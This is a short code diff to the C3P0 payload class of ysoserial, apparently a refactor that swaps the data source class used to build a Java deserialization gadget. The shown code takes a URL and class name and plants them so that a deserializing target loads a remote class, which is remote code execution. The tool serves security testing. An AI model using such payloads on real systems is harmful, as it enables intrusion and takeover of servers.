@@ -12,7 +12,7 @@ import javax.naming.Referenceable;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
 
-import com.mchange.v2.c3p0.PoolBackedDataSource;
+
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 
 import ysoserial.payloads.annotation.Authors;
@@ -51,7 +51,7 @@ public class C3P0 implements ObjectPayload<Object> {
         String url = command.substring(0, sep);
         String className = command.substring(sep + 1);
 
-        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
         return b;
     }
